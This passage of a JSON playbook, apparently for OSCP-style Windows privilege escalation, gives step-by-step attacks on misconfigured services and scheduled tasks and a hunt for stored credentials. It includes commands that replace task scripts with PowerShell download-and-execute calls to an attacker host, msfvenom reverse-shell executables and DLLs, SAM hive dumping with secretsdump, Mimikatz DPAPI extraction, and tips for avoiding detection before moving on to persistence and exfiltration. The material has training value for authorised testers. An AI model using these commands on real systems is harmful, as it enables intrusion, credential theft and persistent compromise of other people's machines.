callback\n\n6. Restore original binPath:\n   sc config <ServiceName> binPath= \"<original_path>\"\n\nPRIORITY SERVICES TO CHECK:\n- Custom applications (more likely misconfigured)\n- Third-party software (antivirus, backup tools)\n- Services running as SYSTEM (highest value)\n- Auto-start services (persist across reboots)\n\nCOMMON MISCONFIGURATIONS:\n- Everyone has Full Control on service binary\n- Authenticated Users can change service config\n- Service binary in user-writable directory (C:\\temp, C:\\Users\\Public)",
      "command_ref": "win-weak-service-perms",
      "dependencies": [
        "automated-enumeration"
      ],
      "evidence": [
        "Service with weak permissions identified (SERVICE_CHANGE_CONFIG or writable binary)",
        "Service runs as SYSTEM (sc qc shows SERVICE_START_NAME: LocalSystem)",
        "Service can be restarted (manually or auto-start)",
        "Current user has necessary permissions to exploit"
      ],
      "success_criteria": [
        "Weak service permissions confirmed via accesschk or icacls",
        "Service binary replaced or configuration modified successfully",
        "Service restarts without errors",
        "Payload executes with service privileges (ideally SYSTEM)"
      ],
      "failure_conditions": [
        "No services with weak permissions found",
        "Services found but run as low-privilege accounts (limited value)",
        "Cannot restart service (Access denied or service dependencies prevent restart)",
        "AV detects and blocks malicious payload in service path",
        "Service protected by Windows Resource Protection (some system services)"
      ],
      "conditional_logic": {
        "IF service with SERVICE_CHANGE_CONFIG found": {
          "action": "Modify service binPath to malicious command",
          "reason": "Can change service configuration without replacing binary. Cleaner, easier to restore.",
          "priority": "HIGH",
          "time_estimate": "5 minutes"
        },
        "IF service binary is writable": {
          "action": "Backup and replace service binary with payload",
          "reason": "Direct binary replacement. Ensure payload matches architecture (x86 vs x64) and is proper Windows service executable.",
          "priority": "MEDIUM",
          "time_estimate": "10 minutes (including payload generation as service)"
        },
        "IF service runs as SYSTEM": {
          "action": "Prioritize this service over user-level services",
          "reason": "SYSTEM shell is goal. User-level service exploitation only gets you to that user's privileges."
        },
        "IF cannot restart service manually": {
          "action": "Check if auto-start on boot, or check service dependencies",
          "reason": "Some services require reboot or dependent services to be stopped first. May need to wait or adjust exploitation approach."
        },
        "IF no weak service permissions found": {
          "action": "Continue to Step 9 (scheduled tasks)",
          "reason": "Service hardening is good. Move to scheduled task misconfiguration checks."
        }
      },
      "next_steps": [
        "verify-system-access",
        "scheduled-tasks-check"
      ]
    },
    {
      "id": "scheduled-tasks-check",
      "name": "Scheduled Task Exploitation",
      "objective": "Identify scheduled tasks with writable scripts/binaries that run with elevated privileges",
      "description": "SCHEDULED TASKS PRIVILEGE ESCALATION:\n\nENUMERATION:\n\n1. List all scheduled tasks:\n   schtasks /query /fo LIST /v\n\n2. Filter for tasks running as SYSTEM:\n   schtasks /query /fo LIST /v | findstr /C:\"Task To Run\" /C:\"Run As User\"\n\n3. List task files directly:\n   dir C:\\windows\\system32\\tasks /s\n\nLOOK FOR:\n- Tasks running as SYSTEM or Administrator\n- Tasks that execute scripts (.bat, .ps1, .vbs)\n- Tasks with predictable schedule (next run time)\n- Script/binary paths that are writable by current user\n\nVERIFY WRITE PERMISSIONS:\n\nFor PowerShell script:\n  icacls \"C:\\Scripts\\backup.ps1\"\n\nFor batch file:\n  icacls \"C:\\Scripts\\cleanup.bat\"\n\nFor executable:\n  icacls \"C:\\Tools\\monitor.exe\"\n\nLook for:\n- (F) Full control\n- (M) Modify\n- (W) Write  \n- For current user or Everyone/Authenticated Users\n\nEXPLOITATION WORKFLOW:\n\n1. Identify writable task script:\n   Task: BackupTask\n   Runs: C:\\Scripts\\backup.ps1\n   As: SYSTEM\n   Next Run: Daily at 3:00 AM\n\n2. Backup original script:\n   copy C:\\Scripts\\backup.ps1 C:\\Scripts\\backup.ps1.bak\n\n3. Replace with malicious content:\n   \n   For .ps1 (PowerShell):\n     echo IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1') > C:\\Scripts\\backup.ps1\n   \n   For .bat (Batch):\n     echo powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1') > C:\\Scripts\\cleanup.bat\n   \n   For .vbs (VBScript):\n     echo Set shell = CreateObject(\"WScript.Shell\") > C:\\Scripts\\task.vbs\n     echo shell.Run \"powershell -c IEX(...)\" >> C:\\Scripts\\task.vbs\n\n4. Wait for scheduled execution OR force run:\n   schtasks /run /tn BackupTask\n\n5. Receive SYSTEM shell when task executes\n\n6. Restore original:\n   copy C:\\Scripts\\backup.ps1.bak C:\\Scripts\\backup.ps1\n\nALTERNATIVE: Binary Replacement\n\nIf task executes binary (not script):\n1. Generate service-compatible payload:\n   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > evil.exe\n\n2. Replace task binary:\n   copy C:\\Tools\\monitor.exe C:\\Tools\\monitor.exe.bak\n   copy evil.exe C:\\Tools\\monitor.exe\n\n3. Wait for task execution or force run\n\nTIMING CONSIDERATIONS:\n- If next run is hours away: Force immediate execution with /run\n- If cannot force run: Note for later, continue with other privesc methods\n- If task runs frequently (every 5 minutes): Wait for automatic execution\n\nCOMMON LOCATIONS FOR TASK SCRIPTS:\n- C:\\Scripts\\ (custom scripts)\n- C:\\Tools\\ (administrative utilities)\n- C:\\Users\\Administrator\\Documents\\ (user scripts)\n- C:\\inetpub\\scripts\\ (IIS-related tasks)\n\nWARNINGS:\n- Some tasks are critical (backup, monitoring). Replacement may break functionality.\n- Always backup original script/binary.\n- Restore after exploitation to avoid detection/system issues.\n- Task execution may be logged (Event ID 4698, 4702).",
      "command_ref": "win-scheduled-tasks",
      "dependencies": [
        "automated-enumeration"
      ],
      "evidence": [
        "Scheduled task found running as SYSTEM or Administrator",
        "Task script/binary path is writable by current user",
        "Task has predictable schedule or can be manually triggered",
        "Backup of original script/binary created"
      ],
      "success_criteria": [
        "Writable task script/binary identified",
        "Original backed up successfully",
        "Malicious payload placed in task path",
        "Task executes (automatically or manually triggered)",
        "Elevated shell received when task runs"
      ],
      "failure_conditions": [
        "No scheduled tasks running as SYSTEM/Admin",
        "All task scripts/binaries have proper permissions (not writable)",
        "Task found but cannot trigger manually and next run is too far in future",
        "AV detects and blocks malicious script/binary",
        "Task protected by Windows Task Scheduler ACLs (some default tasks)"
      ],
      "conditional_logic": {
        "IF writable task script found running as SYSTEM": {
          "action": "Backup and replace script immediately",
          "reason": "Clear path to SYSTEM. Task will execute malicious code with SYSTEM privileges on next run.",
          "time_estimate": "10-20 minutes (depends on task schedule)"
        },
        "IF can force task execution with /run": {
          "action": "Force immediate execution after payload placement",
          "reason": "No waiting for scheduled time. Immediate privilege escalation.",
          "command": "schtasks /run /tn <TaskName>"
        },
        "IF cannot force run and next execution is > 1 hour away": {
          "action": "Note for later, continue with other privesc methods in meantime",
          "reason": "Don't waste time waiting. Try other exploitation paths. Return to task later if needed."
        },
        "IF task runs as standard user (not SYSTEM)": {
          "action": "Lower priority - only useful if that user has more privileges than current user",
          "reason": "Escalation to another user account, not to SYSTEM. May still be valuable for credential access or lateral movement."
        },
        "IF no writable tasks found": {
          "action": "Continue to Step 10 (manual enumeration)",
          "reason": "Scheduled tasks properly configured. Try manual enumeration for other vectors."
        }
      },
      "next_steps": [
        "verify-system-access",
        "manual-enumeration"
      ]
    },
    {
      "id": "manual-enumeration",
      "name": "Manual Privilege Escalation Checks",
      "objective": "Perform manual enumeration for privilege escalation vectors that automated tools may miss",
      "description": "MANUAL ENUMERATION (when automated tools find nothing):\n\n1. REGISTRY CREDENTIAL HUNTING:\n   \n   AutoLogon credentials:\n     reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" | findstr /i \"DefaultUserName DefaultDomainName DefaultPassword\"\n   \n   VNC passwords:\n     reg query HKLM /f password /t REG_SZ /s\n     reg query HKCU /f password /t REG_SZ /s\n   \n   Putty sessions:\n     reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\n   \n   SNMP community strings:\n     reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\n\n2. SAVED CREDENTIALS:\n   \n   Windows Credential Manager:\n     cmdkey /list\n   \n   If credentials found:\n     runas /savecred /user:DOMAIN\\Administrator cmd\n   \n   Credential files:\n     dir /s /b C:\\*cred* C:\\*password* C:\\*.config 2>nul\n\n3. SAM/SYSTEM BACKUP FILES:\n   \n   Check for backup files:\n     dir /s /b C:\\Windows\\repair\\SAM\n     dir /s /b C:\\Windows\\System32\\config\\RegBack\\SAM\n   \n   If found, extract and crack offline:\n     reg save HKLM\\SAM sam.hiv\n     reg save HKLM\\SYSTEM system.hiv\n     impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL\n\n4. GROUP MEMBERSHIP PRIVILEGES:\n   \n   Check special groups:\n     whoami /groups | findstr /i \"Backup Operators\"\n     whoami /groups | findstr /i \"Server Operators\"\n   \n   Backup Operators = Can read any file (dump SAM)\n   Server Operators = Can modify services\n\n5. DLL HIJACKING:\n   \n   Check PATH for writable directories:\n     echo %PATH%\n     icacls \"C:\\CustomPath\"\n   \n   Search for missing DLLs with Process Monitor:\n     - Run procmon.exe\n     - Filter: Result = NAME NOT FOUND, Path ends with .dll\n     - Check if DLL path is writable\n   \n   Create malicious DLL:\n     msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> -f dll > evil.dll\n   \n   Place in hijackable location and trigger application\n\n6. PASSWORD FILES:\n   \n   Search common locations:\n     dir /s /b C:\\*pass* C:\\*pwd* C:\\*credential* 2>nul | findstr /v \"[System32 SysWOW64]\"\n   \n   Check user directories:\n     dir /s /b C:\\Users\\*\\Desktop\\*.txt\n     dir /s /b C:\\Users\\*\\Documents\\*.txt\n     dir /s /b C:\\Users\\*\\*.kdbx (KeePass databases)\n   \n   Configuration files:\n     type C:\\inetpub\\wwwroot\\web.config | findstr /i password\n     type C:\\xampp\\passwords.txt\n     type C:\\Program Files\\FileZilla Server\\FileZilla Server.xml\n\n7. DPAPI MASTER KEYS:\n   \n   Find master keys:\n     dir /a /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\ 2>nul\n   \n   Extract with Mimikatz (requires elevation - catch-22):\n     mimikatz# dpapi::masterkey /in:<masterkey_file>\n   \n   Decrypt Chrome/RDP/WiFi passwords after obtaining master key\n\n8. KERNEL EXPLOIT RESEARCH:\n   \n   Get detailed system info:\n     systeminfo > systeminfo.txt\n   \n   Transfer to attacker machine:\n     certutil -urlcache -f http://<LHOST>/systeminfo.txt system.txt\n   \n   Run Windows Exploit Suggester:\n     python windows-exploit-suggester.py --database 2024-mssb.xls --systeminfo systeminfo.txt\n   \n   Prioritize HIGH severity exploits\n   \n   Common OSCP kernel exploits:\n     - MS16-032 (Win7, Server 2008)\n     - MS15-051 (Win7, Server 2008)\n     - MS14-058 (Win8.1, Server 2012)\n     - MS11-046 (WinXP, Server 2003 - rare now)\n\n9. RUNNING PROCESSES:\n   \n   List all processes:\n     tasklist /v\n   \n   Check for interesting services:\n     - Database servers (MySQL, PostgreSQL)\n     - File transfer apps (FileZilla, WinSCP)\n     - Remote access tools (TeamViewer, AnyDesk)\n     - Password managers (KeePass, LastPass)\n   \n   Dump process memory (if SeDebugPrivilege):\n     procdump -ma <PID>\n   \n   Search memory dumps for passwords:\n     strings process.dmp | findstr /i password\n\n10. NETWORK SHARES:\n    \n    List available shares:\n      net view \\\\localhost\n      net share\n    \n    Check writable shares:\n      icacls \\\\localhost\\C$\n      icacls \\\\localhost\\ADMIN$\n    \n    Enumerate network shares on domain:\n      net view /domain\n      for /f %i in ('net view ^| findstr \"^\\\\\\\\\"') do @echo %i & @net view %i /all\n\nPRIORITIZATION:\n1. Saved credentials (cmdkey /list) - Immediate win if found\n2. Registry passwords (AutoLogon) - Cleartext credentials\n3. SAM backups - Offline hash cracking\n4. Group privileges (Backup Operators) - Special capabilities\n5. Password files - Low-hanging fruit\n6. DLL hijacking - Requires local application execution\n7. Kernel exploits - Last resort (stability risk)\n\nTIME ALLOCATION:\n- Registry hunting: 5 minutes\n- Saved credentials: 2 minutes  \n- File searching: 10 minutes\n- Kernel exploit research: 5 minutes\n- Total: ~20-25 minutes",
      "command_ref": "win-registry-autologon",
      "dependencies": [
        "automated-enumeration"
      ],
      "evidence": [
        "Registry keys queried for credentials",
        "File system searched for password files",
        "Saved credentials enumerated (cmdkey /list output)",
        "Group memberships verified (whoami /groups)",
        "Process list reviewed for sensitive applications"
      ],
      "success_criteria": [
        "At least one manual check reveals exploitable information",
        "Credentials found (registry, files, or saved creds)",
        "Special group membership identified (Backup Operators, etc.)",
        "Kernel exploit identified for system version"
      ],
      "failure_conditions": [
        "All manual checks return no findings (highly hardened system)",
        "Credentials found but don't work (expired, wrong context)",
        "Kernel exploits identified but fail to execute (patched, incompatible)",
        "Time spent on manual enum exceeds value (>30 minutes with no results)"
      ],
      "conditional_logic": {
        "IF registry AutoLogon credentials found": {
          "action": "Use credentials with runas or lateral movement",
          "reason": "Cleartext admin password often stored. Immediate credential reuse opportunity.",
          "command": "runas /user:Administrator cmd"
        },
        "IF saved credentials found (cmdkey /list)": {
          "action": "Execute command with runas /savecred",
          "reason": "Can run commands as cached admin user without knowing password.",
          "command": "runas /savecred /user:Administrator cmd"
        },
        "IF Backup Operators group membership": {
          "action": "Use backup privilege to dump SAM/SYSTEM hives",
          "reason": "Backup Operators can read any file regardless of ACL. Extract password hashes.",
          "tools": "Backup rights allow reg save on SAM/SYSTEM hives"
        },
        "IF Server Operators group membership": {
          "action": "Modify service configuration to escalate",
          "reason": "Server Operators can create and modify services. Similar to SERVICE_CHANGE_CONFIG exploitation.",
          "path": "Use sc config to modify service binPath"
        },
        "IF SAM/SYSTEM backup files found": {
          "action": "Extract and transfer for offline hash cracking",
          "reason": "Backup files contain password hashes. Crack offline without detection.",
          "command": "impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL"
        },
        "IF kernel exploit identified": {
          "action": "LAST RESORT - Attempt kernel exploitation with caution",
          "reason": "Kernel exploits can crash system. Only use if all other methods exhausted. Test in lab environment first if possible.",
          "warning": "May cause system instability or blue screen"
        },
        "IF all manual checks fail": {
          "action": "Re-evaluate initial access vector or escalate via application vulnerabilities",
          "reason": "System may be properly hardened for privilege escalation. Look for application-layer exploits (vulnerable installed software) or revisit enumeration with different tools."
        }
      },
      "next_steps": [
        "verify-system-access",
        "lateral-movement-preparation"
      ]
    },
    {
      "id": "verify-system-access",
      "name": "Verify SYSTEM/Administrator Access",
      "objective": "Confirm effective privilege escalation to SYSTEM or Administrator level access",
      "description": "VERIFICATION STEPS:\n\n1. Verify Current User:\n   whoami\n   \n   Expected outputs:\n   - nt authority\\system (SYSTEM - highest privilege)\n   - DOMAIN\\Administrator (Domain admin)\n   - <HOSTNAME>\\Administrator (Local admin)\n   - DOMAIN\\<user> with High integrity (Admin user with UAC bypass)\n\n2. Verify Privileges:\n   whoami /priv\n   \n   Look for:\n   - SeDebugPrivilege (Enabled) - Can debug processes, dump LSASS\n   - SeTcbPrivilege (Enabled) - Act as part of OS\n   - SeBackupPrivilege (Enabled) - Can backup any file\n   - SeRestorePrivilege (Enabled) - Can restore any file\n   - SeImpersonatePrivilege (Enabled) - Already used for Potato\n   \n   SYSTEM has ALL privileges enabled.\n\n3. Verify Integrity Level:\n   whoami /groups | findstr /i \"Mandatory Label\"\n   \n   Expected:\n   - System Mandatory Level (SYSTEM)\n   - High Mandatory Level (Administrator)\n   \n   NOT acceptable:\n   - Medium Mandatory Level (still filtered admin - need UAC bypass)\n\n4. Test Filesystem Access:\n   \n   Read SAM registry:\n     reg query HKLM\\SAM\\SAM\\Domains\\Account\\Users\n     (Access granted = SYSTEM or admin with High integrity)\n   \n   List protected directory:\n     dir C:\\Windows\\System32\\config\n     (Should see SAM, SYSTEM, SECURITY files)\n   \n   Access ADMIN$ share:\n     dir \\\\localhost\\C$\n     dir \\\\localhost\\ADMIN$\n     (Access granted = admin privileges)\n\n5. Test Service Management:\n   \n   Query service:\n     sc query <any_service>\n   \n   Create test service (then delete):\n     sc create TestService binPath= \"C:\\Windows\\System32\\cmd.exe\"\n     sc delete TestService\n     (Success = admin/SYSTEM access)\n\n6. Verify Group Membership:\n   \n   whoami /groups\n   \n   Look for:\n   - BUILTIN\\Administrators (S-1-5-32-544)\n   - NT AUTHORITY\\SYSTEM (S-1-5-18) if SYSTEM user\n   - Domain Admins (S-1-5-21-<domain>-512) if domain admin\n\nSUCCESS CRITERIA:\n\u2713 User is nt authority\\system OR Administrator account\n\u2713 Integrity level is System or High\n\u2713 All critical privileges enabled\n\u2713 Can access protected files (SAM registry, config files)\n\u2713 Can manage services (create/modify/delete)\n\u2713 Can access administrative shares (C$, ADMIN$)\n\nFAILURE INDICATORS:\n\u2717 User is still low-privilege account\n\u2717 Integrity level is Medium (UAC filtering active)\n\u2717 Access denied on protected resources\n\u2717 Cannot create/modify services\n\u2717 Administrative shares inaccessible\n\nIF VERIFICATION FAILS:\n- Exploitation may have partially succeeded\n- Check if new shell spawned in background (check process list)\n- Verify exploit payload executed (check logs, network traffic)\n- Try alternative exploitation method\n- Re-run enumeration to find missed vectors\n\nNEXT STEPS AFTER CONFIRMATION:\n1. Credential dumping (Mimikatz, secretsdump)\n2. Persistence mechanisms (new admin user, scheduled task, service)\n3. Lateral movement preparation (enumerate domain, find targets)\n4. Sensitive data exfiltration (database dumps, file searches)\n5. Evidence collection for documentation",
      "command_ref": "windows-whoami-privs",
      "dependencies": [
        "potato-exploitation",
        "alwaysinstallelevated-exploit",
        "unquoted-service-check",
        "service-permissions-check",
        "scheduled-tasks-check",
        "manual-enumeration"
      ],
      "evidence": [
        "whoami output shows SYSTEM or Administrator account",
        "whoami /priv shows extensive enabled privileges",
        "Integrity level is System or High Mandatory Level",
        "Can access protected registry keys (HKLM\\SAM)",
        "Can manage services (sc create succeeds)",
        "Can access administrative shares (\\\\localhost\\C$)"
      ],
      "success_criteria": [
        "User context is SYSTEM or Administrator",
        "High or System integrity level confirmed",
        "All privilege escalation objectives met",
        "Full access to protected system resources",
        "Can perform post-exploitation tasks without restrictions"
      ],
      "failure_conditions": [
        "Still low-privilege user after exploitation attempt",
        "Integrity level remains Medium (UAC not bypassed)",
        "Access denied on administrative operations",
        "Exploitation command executed but shell not elevated",
        "Exploit succeeded but shell spawned in wrong context"
      ],
      "conditional_logic": {
        "IF whoami shows SYSTEM and High/System integrity": {
          "action": "PRIVILEGE ESCALATION COMPLETE - Proceed to post-exploitation",
          "reason": "Full SYSTEM access achieved. Can now dump credentials, create persistence, move laterally.",
          "next_phase": "Post-exploitation (credential dumping, persistence, lateral movement)"
        },
        "IF whoami shows Administrator but Medium integrity": {
          "action": "UAC bypass still needed - return to uac-bypass-check",
          "reason": "Admin user but UAC filtering active. Need to elevate to High integrity for full capabilities.",
          "fix": "Run fodhelper-uac-bypass or eventvwr-uac-bypass"
        },
        "IF still low-privilege user": {
          "action": "Exploitation failed - review exploit execution and try alternative method",
          "reason": "Privilege escalation did not succeed. Check exploit compatibility, permissions, AV interference.",
          "troubleshooting": [
            "Verify exploit binary executed (check process list)",
            "Check for AV quarantine (Get-MpThreatDetection)",
            "Review exploit output for errors",
            "Try alternative exploitation technique"
          ]
        },
        "IF verification partially succeeds": {
          "action": "Investigate partial success - may need additional steps",
          "reason": "Some admin capabilities working but not all. May be in restricted admin session or incomplete privilege escalation."
        }
      },
      "next_steps": [
        "credential-dumping",
        "persistence-establishment",
        "lateral-movement-preparation"
      ]
    }
  ]
}